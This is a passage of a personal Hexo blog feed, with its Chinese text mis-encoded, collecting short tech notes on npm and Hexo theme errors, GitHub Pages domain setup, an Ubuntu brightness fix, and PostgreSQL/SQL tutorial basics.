    <content type="html"><![CDATA[<p>è¯­æ³•:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">!<span class="hljs-selector-attr">[æ˜¾ç¤ºå¤±è´¥æ—¶æ˜¾ç¤ºçš„æ–‡å­—]</span>(æ–‡ä»¶çš„æœ¬åœ°è·¯å¾„)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Markdown</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Github Pages å’Œä¸ªäººåŸŸåç»‘å®š</title>
    <link href="/2022/08/17/Github-Pages-%E5%92%8C%E4%B8%AA%E4%BA%BA%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/"/>
    <url>/2022/08/17/Github-Pages-%E5%92%8C%E4%B8%AA%E4%BA%BA%E5%9F%9F%E5%90%8D%E7%BB%91%E5%AE%9A/</url>
    
    <content type="html"><![CDATA[<p>æ·»åŠ ä¸¤æ¡è®°å½•.<br><img src="/img/add_records.png" alt="adding records1"><br><img src="/img/add_records1.png" alt="adding records2"></p><p>è®°å½•å€¼æ˜¯è¾“å…¥åŸŸå.</p><p>åœ¨Github Pages ä¸­æ·»åŠ ã€‚åœ¨æ·»åŠ äº†è®°å½•ä¹‹å, æ·»åŠ å¯èƒ½è¿˜æ˜¯ä¼šå¤±è´¥, ç­‰å¾…ä¸€æ®µæ—¶é—´å°±å¯ä»¥æˆåŠŸã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo fluid ä¸»é¢˜ ERROR Script load failed é—®é¢˜</title>
    <link href="/2022/08/17/hexo-fluid-%E4%B8%BB%E9%A2%98-ERROR-Script-load-failed-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/08/17/hexo-fluid-%E4%B8%BB%E9%A2%98-ERROR-Script-load-failed-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>é¦–å…ˆé€šè¿‡ cnpm é‡æ–°å®‰è£… fluid ä¸»é¢˜.</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install <span class="hljs-comment">--save hexo-theme-fluid</span><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ hexo åšå®¢ç›®å½•ä¸­çš„ <code>_config.yml</code>:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">theme:</span> fluid<br><span class="hljs-symbol">language:</span> <span class="hljs-built_in">zh</span>-CN<br></code></pre></td></tr></table></figure><p>é‡åˆ° <code>peerDependencies WARNING</code>. çœ‹çœ‹ç¼ºä»€ä¹ˆï¼Œç„¶åé¡ºç€å®‰è£….</p>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>npm ERR! Cannot read properties of null()</title>
    <link href="/2022/08/16/npm-ERR-Cannot-read-properties-of-null/"/>
    <url>/2022/08/16/npm-ERR-Cannot-read-properties-of-null/</url>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨<code>npn install hexo-util --save</code> æ—¶æŠ¥è¿™ä¸ªé”™.</p><p>ä½¿ç”¨<code>npm cache clear --force</code> æ—¶æŠ¥ <code>npm WARN using --force Recommended protections disabled</code></p><p>ç”¨<code>npm cache verify</code> æ£€æŸ¥ cache æ˜¯å¦æ­£å¸¸å·¥ä½œ.</p><p>æˆ‘çš„ npm å½“å‰ç‰ˆæœ¬ä¸º 8.11.0.</p><p>é™ä½ç‰ˆæœ¬:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">npm</span> install npm@<span class="hljs-number">6</span>.<span class="hljs-number">14</span>.<span class="hljs-number">10</span> -g<br></code></pre></td></tr></table></figure><p>è‹¥æŠ¥é”™ï¼Œåˆ™ä½¿ç”¨:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cnpm</span> install npm@<span class="hljs-number">6</span>.<span class="hljs-number">14</span>.<span class="hljs-number">10</span> -g<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>npm install æŠ¥é”™</title>
    <link href="/2022/08/16/npm-install-%E6%8A%A5%E9%94%99/"/>
    <url>/2022/08/16/npm-install-%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨ <code>cnpm</code> ä¸‹è½½.</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨ nrm</title>
    <link href="/2022/08/16/%E4%BD%BF%E7%94%A8-nrm/"/>
    <url>/2022/08/16/%E4%BD%BF%E7%94%A8-nrm/</url>
    
    <content type="html"><![CDATA[<p>æŸ¥è¯¢å·²æœ‰æº:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nrm <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>åˆ‡æ¢æº:</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">npm <span class="hljs-keyword">use</span> &lt;<span class="hljs-keyword">name</span>&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å®‰è£…hexo fluidä¸»é¢˜</title>
    <link href="/2022/08/16/%E5%AE%89%E8%A3%85hexo-fluid%E4%B8%BB%E9%A2%98/"/>
    <url>/2022/08/16/%E5%AE%89%E8%A3%85hexo-fluid%E4%B8%BB%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>hexo çš„ç‰ˆæœ¬åœ¨ 5.0.0 ä»¥ä¸Šï¼Œç›´æ¥é€šè¿‡ npm å®‰è£…:</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install <span class="hljs-comment">--save hexo-theme-fluid</span><br></code></pre></td></tr></table></figure><p>ç„¶åå°† <code>_config.yml</code>çš„å†…å®¹å¤åˆ¶åˆ° <code>_config.fluid.yml</code> ä¸­ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu 22.04 æ— æ³•è°ƒèŠ‚äº®åº¦</title>
    <link href="/2022/08/14/Ubuntu-22-04-%E6%97%A0%E6%B3%95%E8%B0%83%E8%8A%82%E4%BA%AE%E5%BA%A6/"/>
    <url>/2022/08/14/Ubuntu-22-04-%E6%97%A0%E6%B3%95%E8%B0%83%E8%8A%82%E4%BA%AE%E5%BA%A6/</url>
    
    <content type="html"><![CDATA[<p>è¿›å…¥BIOS, å°† Graphic Device ä¸­çš„ Discrete Graphic æ”¹ä¸º Dynamic Graphics.</p>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQLåŸºç¡€æ•™ç¨‹ Notes</title>
    <link href="/2022/08/10/SQL%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B-Notes/"/>
    <url>/2022/08/10/SQL%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬0ç« -ç»ªè®º-æ­å»ºSQLçš„å­¦ä¹ ç¯å¢ƒ"><a href="#ç¬¬0ç« -ç»ªè®º-æ­å»ºSQLçš„å­¦ä¹ ç¯å¢ƒ" class="headerlink" title="ç¬¬0ç«  ç»ªè®º æ­å»ºSQLçš„å­¦ä¹ ç¯å¢ƒ"></a>ç¬¬0ç«  ç»ªè®º æ­å»ºSQLçš„å­¦ä¹ ç¯å¢ƒ</h1><h2 id="0-1-PostgreSQLçš„å®‰è£…å’Œè¿æ¥è®¾ç½®"><a href="#0-1-PostgreSQLçš„å®‰è£…å’Œè¿æ¥è®¾ç½®" class="headerlink" title="0-1 PostgreSQLçš„å®‰è£…å’Œè¿æ¥è®¾ç½®"></a>0-1 PostgreSQLçš„å®‰è£…å’Œè¿æ¥è®¾ç½®</h2><p>åœ¨å‘½ä»¤è¡Œä½¿ç”¨postgreSQLéœ€è¦ç™»å½• postgres è´¦æˆ·:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo su postgres</span><br></code></pre></td></tr></table></figure><p>è¿›å…¥ sql å‘½ä»¤è¡Œæ‰§è¡Œ:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>psql<br></code></pre></td></tr></table></figure><p>postgres è´¦æˆ·çš„ç›®å½•åœ¨ &#x2F;var&#x2F;lib&#x2F;postgresql.</p><h2 id="å®˜æ–¹Ubuntuä¸Šä½¿ç”¨postgresqlæ•™ç¨‹"><a href="#å®˜æ–¹Ubuntuä¸Šä½¿ç”¨postgresqlæ•™ç¨‹" class="headerlink" title="å®˜æ–¹Ubuntuä¸Šä½¿ç”¨postgresqlæ•™ç¨‹"></a>å®˜æ–¹Ubuntuä¸Šä½¿ç”¨postgresqlæ•™ç¨‹</h2><p><a href="https://ubuntu.com/server/docs/databases-postgresql">reference</a></p><p>é…ç½®æ–‡ä»¶æ‰€åœ¨ä½ç½®: &#x2F;etc&#x2F;postgresql&#x2F;<version>&#x2F;main, ç›®å½•ä¸­. æˆ‘çš„åœ¨: &#x2F;etc&#x2F;postgresql&#x2F;14&#x2F;main.</p><p>è¿æ¥ default PostgreSQL template database:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> -u postgres psql template1<br></code></pre></td></tr></table></figure><p>To configure the password for the user postgres:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> postgres <span class="hljs-keyword">with</span> <span class="hljs-keyword">encrypted</span> <span class="hljs-keyword">password</span> <span class="hljs-string">&#x27;your_password&#x27;</span>;<br></code></pre></td></tr></table></figure><p>Restarting the PostgreSQL service to initialize the new configuration:</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">sudo systemctl <span class="hljs-built_in">restart</span> postgresql.service<br></code></pre></td></tr></table></figure><h2 id="0-1"><a href="#0-1" class="headerlink" title="0-1"></a>0-1</h2><p><code>listen_addresses = &#39;*&#39;</code> æ„å‘³ç€å…è®¸æ‰€æœ‰è¿œç¨‹ä¸»æœºè¿›è¡Œè¿æ¥ã€‚<br><code>listen_addresses = &#39;localhost&#39;</code> æ„å‘³ç€åªå…è®¸æœ¬åœ°æœºå™¨è¿›è¡Œè¿æ¥ã€‚</p><h2 id="0-2-é€šè¿‡PostgreSQLæ‰§è¡ŒSQLè¯­å¥"><a href="#0-2-é€šè¿‡PostgreSQLæ‰§è¡ŒSQLè¯­å¥" class="headerlink" title="0-2 é€šè¿‡PostgreSQLæ‰§è¡ŒSQLè¯­å¥"></a>0-2 é€šè¿‡PostgreSQLæ‰§è¡ŒSQLè¯­å¥</h2><p><code>psql</code> æ˜¯ PostpreSQL æä¾›çš„é€šè¿‡å‘½ä»¤è¡Œæ‰§è¡Œ SQL è¯­å¥çš„å·¥å…·ã€‚</p><p><code>psql</code> ä¼šæŠŠ SQL è¯­å¥å‘é€ç»™ PostgreSQL, ç„¶åå†å°†æ¥æ”¶åˆ°çš„æ‰§è¡Œç»“æœæ˜¾ç¤ºå‡ºæ¥ã€‚</p><p>â€œ;â€ æ˜¯ SQL çš„ç»“æŸç¬¦ï¼Œ å¦‚æœæ²¡æœ‰è¾“å…¥çš„è¯ï¼Œå³ä½¿æŒ‰ä¸‹å›è½¦é”®ï¼ŒSQLè¯­å¥ä¹Ÿä¸ä¼šæ‰§è¡Œã€‚</p><p>æ•°æ®åº“çš„åç§°åªèƒ½æ˜¯å°å†™å­—æ¯.</p><h3 id="åˆ›å»ºå­¦ä¹ ç”¨çš„æ•°æ®åº“"><a href="#åˆ›å»ºå­¦ä¹ ç”¨çš„æ•°æ®åº“" class="headerlink" title="åˆ›å»ºå­¦ä¹ ç”¨çš„æ•°æ®åº“"></a>åˆ›å»ºå­¦ä¹ ç”¨çš„æ•°æ®åº“</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> shop;<br></code></pre></td></tr></table></figure><p><code>postgres</code> æ˜¯å®‰è£… PostgreSQL æ—¶è‡ªåŠ¨åˆ›å»ºçš„ç¤ºä¾‹æ•°æ®åº“ã€‚</p><h3 id="è¿æ¥å­¦ä¹ ç”¨çš„æ•°æ®åº“-ç™»å½•"><a href="#è¿æ¥å­¦ä¹ ç”¨çš„æ•°æ®åº“-ç™»å½•" class="headerlink" title="è¿æ¥å­¦ä¹ ç”¨çš„æ•°æ®åº“(ç™»å½•)"></a>è¿æ¥å­¦ä¹ ç”¨çš„æ•°æ®åº“(ç™»å½•)</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">psql -U postgres -d shop</span><br></code></pre></td></tr></table></figure><p>â€œ-d shopâ€ æ˜¯æŒ‡å®š â€œæ•°æ®åº“shopâ€ çš„æ„æ€ã€‚</p><p>â€œ-U usernameâ€ æ˜¯ connect to the database as the user <code>username</code> instead of the default. </p><h1 id="ç¬¬1ç« -æ•°æ®åº“å’ŒSQL"><a href="#ç¬¬1ç« -æ•°æ®åº“å’ŒSQL" class="headerlink" title="ç¬¬1ç«  æ•°æ®åº“å’ŒSQL"></a>ç¬¬1ç«  æ•°æ®åº“å’ŒSQL</h1><h2 id="1-1-æ•°æ®åº“æ˜¯ä»€ä¹ˆ"><a href="#1-1-æ•°æ®åº“æ˜¯ä»€ä¹ˆ" class="headerlink" title="1-1 æ•°æ®åº“æ˜¯ä»€ä¹ˆ"></a>1-1 æ•°æ®åº“æ˜¯ä»€ä¹ˆ</h2><p>æ•°æ®åº“(Database, DB)æ˜¯å°†å¤§é‡æ•°æ®ä¿å­˜èµ·æ¥ï¼Œé€šè¿‡è®¡ç®—æœºåŠ å·¥è€Œæˆçš„å¯ä»¥è¿›è¡Œé«˜æ•ˆè®¿é—®çš„æ•°æ®é›†åˆã€‚</p><p>ç”¨æ¥ç®¡ç†æ•°æ®åº“çš„è®¡ç®—æœºç³»ç»Ÿç§°ä¸º<mark>Database Management System, DBMS</mark>.</p><p>ç³»ç»Ÿä½¿ç”¨è€…é€šå¸¸æ— æ³•ç›´æ¥æ¥è§¦åˆ°æ•°æ®åº“ã€‚</p><h3 id="DSMSçš„ç§ç±»"><a href="#DSMSçš„ç§ç±»" class="headerlink" title="DSMSçš„ç§ç±»"></a>DSMSçš„ç§ç±»</h3><p>é€šè¿‡æ•°æ®çš„ä¿å­˜æ ¼å¼(æ•°æ®åº“çš„ç§ç±»)æ¥åˆ†ç±»ï¼Œç°é˜¶æ®µä¸»è¦æœ‰ä»¥ä¸‹5ç§ç±»å‹:</p><ul><li>Hierarchical Database, HDB</li><li>Relational Database, RDB</li><li>Object Oriented Database, OODB</li><li>XML Database, XMLDB</li><li>Key-Value Store, KVS<br>ä½¿ç”¨SQLè¯­è¨€çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œä¹Ÿå°±æ˜¯å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ(RDBMS).</li></ul><h2 id="1-2-æ•°æ®åº“çš„ç»“æ„"><a href="#1-2-æ•°æ®åº“çš„ç»“æ„" class="headerlink" title="1-2 æ•°æ®åº“çš„ç»“æ„"></a>1-2 æ•°æ®åº“çš„ç»“æ„</h2><h3 id="RDBMS-çš„å¸¸è§ç³»ç»Ÿç»“æ„"><a href="#RDBMS-çš„å¸¸è§ç³»ç»Ÿç»“æ„" class="headerlink" title="RDBMS çš„å¸¸è§ç³»ç»Ÿç»“æ„"></a>RDBMS çš„å¸¸è§ç³»ç»Ÿç»“æ„</h3><p>æœ€å¸¸è§çš„æ˜¯å®¢æˆ·ç«¯&#x2F;æœåŠ¡å™¨ç±»å‹(C&#x2F;Sç±»å‹).</p><p>RDBMS æ—¢å¯ä»¥å’Œå…¶å®¢æˆ·ç«¯å®‰è£…åœ¨åŒä¸€å°è®¡ç®—æœºä¸Šï¼Œä¹Ÿå¯ä»¥åˆ†åˆ«å®‰è£…åœ¨ä¸åŒçš„è®¡ç®—æœºä¸Šã€‚</p><h3 id="è¡¨çš„ç»“æ„"><a href="#è¡¨çš„ç»“æ„" class="headerlink" title="è¡¨çš„ç»“æ„"></a>è¡¨çš„ç»“æ„</h3><p>ç”¨æ¥ç®¡ç†æ•°æ®çš„äºŒç»´è¡¨åœ¨å…³ç³»æ•°æ®åº“ä¸­ç®€ç§°ä¸º<mark>è¡¨</mark>.</p><p>è¡¨å­˜å‚¨åœ¨ç”± RDBMS ç®¡ç†çš„æ•°æ®åº“ä¸­ï¼Œ ä¸€ä¸ªæ•°æ®åº“ä¸­å¯ä»¥å­˜å‚¨å¤šä¸ªè¡¨ã€‚</p><p>æ ¹æ® SQL è¯­å¥çš„å†…å®¹è¿”å›çš„æ•°æ®åŒæ ·å¿…é¡»æ˜¯äºŒç»´è¡¨çš„å½¢å¼ã€‚</p><p>è¡¨çš„åˆ—ï¼ˆå‚ç›´æ–¹å‘ï¼‰ç§°ä¸ºå­—æ®µï¼Œå®ƒä»£è¡¨äº†ä¿å­˜åœ¨è¡¨ä¸­çš„æ•°æ®é¡¹ç›®ã€‚</p><p>è¡¨çš„è¡Œï¼ˆæ°´å¹³æ–¹å‘ï¼‰ç§°ä¸ºè®°å½•ï¼Œå®ƒç›¸å½“äºä¸€æ¡æ•°æ®ã€‚</p><p><mark>å…³ç³»æ•°æ®åº“å¿…é¡»ä»¥è¡Œä¸ºå•ä½è¿›è¡Œæ•°æ®è¯»å†™ã€‚</mark></p><p>è¡Œå’Œåˆ—äº¤æ±‡çš„æ–¹æ ¼ç§°ä¸ºå•å…ƒæ ¼ã€‚ä¸€ä¸ªå•å…ƒæ ¼ä¸­åª<br>èƒ½è¾“å…¥ä¸€ä¸ªæ•°æ®ã€‚å•å…ƒæ ¼åªæ˜¯è¿™æœ¬ä¹¦ç‰¹æœ‰çš„è¡¨è¿°æ–¹å¼.</p><h2 id="1-3-SQL-æ¦‚è¦"><a href="#1-3-SQL-æ¦‚è¦" class="headerlink" title="1-3 SQL æ¦‚è¦"></a>1-3 SQL æ¦‚è¦</h2><h3 id="æ ‡å‡†-SQL"><a href="#æ ‡å‡†-SQL" class="headerlink" title="æ ‡å‡† SQL"></a>æ ‡å‡† SQL</h3><h3 id="SQL-è¯­å¥åŠå…¶ç§ç±»"><a href="#SQL-è¯­å¥åŠå…¶ç§ç±»" class="headerlink" title="SQL è¯­å¥åŠå…¶ç§ç±»"></a>SQL è¯­å¥åŠå…¶ç§ç±»</h3><p>SQL ç”¨å…³é”®å­—ã€è¡¨åã€åˆ—åç­‰ç»„åˆè€Œæˆçš„ä¸€æ¡è¯­å¥ï¼ˆSQL è¯­å¥ï¼‰æ¥æè¿°æ“ä½œçš„å†…å®¹ã€‚</p><p>SQL è¯­å¥å¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸‰ç±»:</p><ul><li>DDL, Data Definition Language, æ•°æ®å®šä¹‰è¯­è¨€ã€‚å…¶åŒ…å«: create, drop, alter.</li><li>DML, Data Manipulation Language, æ•°æ®æ“çºµè¯­è¨€. åŒ…å«: select, insert, update, delete.</li><li>DCL, Data Control Language, æ•°æ®æ§åˆ¶è¯­è¨€ã€‚åŒ…å«: commit, rollback, grant, revoke.</li></ul><h3 id="SQL-çš„åŸºæœ¬ä¹¦å†™è§„åˆ™"><a href="#SQL-çš„åŸºæœ¬ä¹¦å†™è§„åˆ™" class="headerlink" title="SQL çš„åŸºæœ¬ä¹¦å†™è§„åˆ™"></a>SQL çš„åŸºæœ¬ä¹¦å†™è§„åˆ™</h3><ul><li>ä»¥åˆ†å·â€;â€ç»“å°¾</li><li>SQL è¯­å¥ä¸åŒºåˆ†å¤§å°å†™, è¡¨ä¸­çš„æ•°æ®åŒºåˆ†å¤§å°å†™</li><li>å¸¸æ•°çš„ä¹¦å†™æ–¹å¼æ˜¯å›ºå®šçš„ï¼Œåœ¨SQLè¯­å¥ä¸­ç›´æ¥ä¹¦å†™çš„å­—ç¬¦ä¸²ã€æ—¥æœŸæˆ–è€…æ•°å­—ç­‰ç§°ä¸ºå¸¸æ•°, å­—ç¬¦ä¸²å’Œæ—¥æœŸç”¨å•å¼•å·â€â€˜â€œæ ‡è¯†ã€‚</li><li>å•è¯éœ€è¦ç”¨åŠè§’ç©ºæ ¼æˆ–è€…æ¢è¡Œç¬¦æ¥åˆ†éš”</li></ul><h2 id="1-4-è¡¨çš„åˆ›å»º"><a href="#1-4-è¡¨çš„åˆ›å»º" class="headerlink" title="1-4 è¡¨çš„åˆ›å»º"></a>1-4 è¡¨çš„åˆ›å»º</h2><h3 id="è¡¨çš„å†…å®¹çš„åˆ›å»º"><a href="#è¡¨çš„å†…å®¹çš„åˆ›å»º" class="headerlink" title="è¡¨çš„å†…å®¹çš„åˆ›å»º"></a>è¡¨çš„å†…å®¹çš„åˆ›å»º</h3><h3 id="æ•°æ®åº“çš„åˆ›å»º-create-databaseè¯­å¥"><a href="#æ•°æ®åº“çš„åˆ›å»º-create-databaseè¯­å¥" class="headerlink" title="æ•°æ®åº“çš„åˆ›å»º(create databaseè¯­å¥)"></a>æ•°æ®åº“çš„åˆ›å»º(create databaseè¯­å¥)</h3><p>è¯­æ³•:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">database</span> &lt;æ•°æ®åº“åç§°&gt;;<br></code></pre></td></tr></table></figure><h3 id="è¡¨çš„åˆ›å»º-create-tableè¯­å¥"><a href="#è¡¨çš„åˆ›å»º-create-tableè¯­å¥" class="headerlink" title="è¡¨çš„åˆ›å»º(create tableè¯­å¥)"></a>è¡¨çš„åˆ›å»º(create tableè¯­å¥)</h3><p>è¯­æ³•:</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pf">create <span class="hljs-built_in">table</span> <span class="hljs-variable">&lt;è¡¨å&gt;</span><br>(<span class="hljs-variable">&lt;åˆ—å1&gt;</span> <span class="hljs-variable">&lt;æ•°æ®ç±»å‹&gt;</span> <span class="hljs-variable">&lt;è¯¥åˆ—æ‰€éœ€çº¦æŸ&gt;</span>,<br> <span class="hljs-variable">&lt;åˆ—å2&gt;</span> <span class="hljs-variable">&lt;æ•°æ®ç±»å‹&gt;</span> <span class="hljs-variable">&lt;è¯¥åˆ—æ‰€éœ€çº¦æŸ&gt;</span>,<br> <span class="hljs-variable">&lt;åˆ—å3&gt;</span> <span class="hljs-variable">&lt;æ•°æ®ç±»å‹&gt;</span> <span class="hljs-variable">&lt;è¯¥åˆ—æ‰€éœ€çº¦æŸ&gt;</span>,<br> <span class="hljs-variable">&lt;åˆ—å4&gt;</span> <span class="hljs-variable">&lt;æ•°æ®ç±»å‹&gt;</span> <span class="hljs-variable">&lt;è¯¥åˆ—æ‰€éœ€çº¦æŸ&gt;</span>,<br>            .<br>            .<br>            .<br> <span class="hljs-variable">&lt;è¯¥è¡¨çš„çº¦æŸ1&gt;</span>, <span class="hljs-variable">&lt;è¯¥è¡¨çš„çº¦æŸ2&gt;</span>, ......);<br></code></pre></td></tr></table></figure><p><code>NOT NULL</code> çº¦æŸåªèƒ½ä»¥åˆ—ä¸ºå•ä½è¿›è¡Œè®¾ç½®ã€‚</p><h3 id="å‘½åè§„åˆ™"><a href="#å‘½åè§„åˆ™" class="headerlink" title="å‘½åè§„åˆ™"></a>å‘½åè§„åˆ™</h3><p>åªèƒ½ä½¿ç”¨åŠè§’è‹±æ–‡å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ä½œä¸ºæ•°æ®åº“ã€è¡¨å’Œåˆ—çš„åç§°ã€‚</p><p>åç§°å¿…é¡»ä»¥åŠè§’è‹±æ–‡å­—æ¯å¼€å¤´ã€‚</p><p>åœ¨åŒä¸€ä¸ªæ•°æ®åº“ä¸­ä¸èƒ½åˆ›å»ºä¸¤ä¸ªç›¸åŒåç§°çš„åˆ—ã€‚</p><h3 id="æ•°æ®ç±»å‹çš„æŒ‡å®š"><a href="#æ•°æ®ç±»å‹çš„æŒ‡å®š" class="headerlink" title="æ•°æ®ç±»å‹çš„æŒ‡å®š"></a>æ•°æ®ç±»å‹çš„æŒ‡å®š</h3><p>æ‰€æœ‰åˆ—éƒ½å¿…é¡»æŒ‡å®šæ•°æ®ç±»å‹ã€‚</p><p>æ•°æ®ç±»å‹åŒ…æ‹¬:</p><ul><li>integer, æ•°å­—å‹, ä¸èƒ½å­˜å‚¨å°æ•°</li><li>char, å­—ç¬¦å‹, char(10), æŒ‡å®šé•¿åº¦, å…¶ä¸ºå®šé•¿å­—ç¬¦ä¸²</li><li>date, æ—¥æœŸå‹</li><li>varchar, å¯å˜é•¿å­—ç¬¦ä¸², å³ä½¿æœªè¾¾åˆ°æœ€å¤§é•¿åº¦ï¼Œä¹Ÿä¸ä¼šç”¨åŠè§’ç©ºæ ¼è¡¥è¶³<br>æ¯ä¸€åˆ—éƒ½ä¸èƒ½å­˜å‚¨ä¸è¯¥åˆ—æ•°æ®ç±»å‹ä¸ç¬¦çš„æ•°æ®ã€‚</li></ul><h3 id="çº¦æŸçš„è®¾ç½®"><a href="#çº¦æŸçš„è®¾ç½®" class="headerlink" title="çº¦æŸçš„è®¾ç½®"></a>çº¦æŸçš„è®¾ç½®</h3><p>çº¦æŸæ˜¯é™¤äº†æ•°æ®ç±»å‹ä¹‹å¤–ï¼Œå¯¹åˆ—ä¸­å­˜å‚¨çš„æ•°æ®è¿›è¡Œé™åˆ¶æˆ–è€…è¿½åŠ æ¡ä»¶çš„åŠŸèƒ½ã€‚</p><p><code>NULL</code> ä»£è¡¨å¯ä»¥è¾“å…¥ç©ºç™½ã€‚</p><p><code>NOT NULL</code> ä»£è¡¨ä¸èƒ½è¾“å…¥ç©ºç™½.</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">primary</span> <span class="hljs-keyword">key</span> (product_id)<br></code></pre></td></tr></table></figure><p>ç»™<code>product_id</code>åˆ—è®¾ç½®ä¸»é”®çº¦æŸã€‚</p><p>ä¸»é”®çº¦æŸ &#x3D; éç©ºçº¦æŸ + å”¯ä¸€çº¦æŸ</p><h2 id="1-5-è¡¨çš„åˆ é™¤å’Œæ›´æ–°"><a href="#1-5-è¡¨çš„åˆ é™¤å’Œæ›´æ–°" class="headerlink" title="1-5 è¡¨çš„åˆ é™¤å’Œæ›´æ–°"></a>1-5 è¡¨çš„åˆ é™¤å’Œæ›´æ–°</h2><h3 id="è¡¨çš„åˆ é™¤-drop-table"><a href="#è¡¨çš„åˆ é™¤-drop-table" class="headerlink" title="è¡¨çš„åˆ é™¤(drop table)"></a>è¡¨çš„åˆ é™¤(drop table)</h3><p>è¯­æ³•:</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-keyword">drop</span> <span class="hljs-built_in">table</span> <span class="hljs-variable">&lt;è¡¨å&gt;</span>;<br></code></pre></td></tr></table></figure><p>åˆ é™¤çš„è¡¨æ— æ³•æ¢å¤ã€‚</p><h3 id="è¡¨å®šä¹‰çš„æ›´æ–°-alter-table"><a href="#è¡¨å®šä¹‰çš„æ›´æ–°-alter-table" class="headerlink" title="è¡¨å®šä¹‰çš„æ›´æ–°(alter table)"></a>è¡¨å®šä¹‰çš„æ›´æ–°(alter table)</h3><p>è¯­æ³•:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-operator">&lt;</span>è¡¨å<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">add</span> <span class="hljs-keyword">column</span> <span class="hljs-operator">&lt;</span>åˆ—çš„å®šä¹‰<span class="hljs-operator">&gt;</span>;<br></code></pre></td></tr></table></figure><p>åˆ é™¤åˆ—çš„<code>alter table</code> è¯­å¥:</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">alter <span 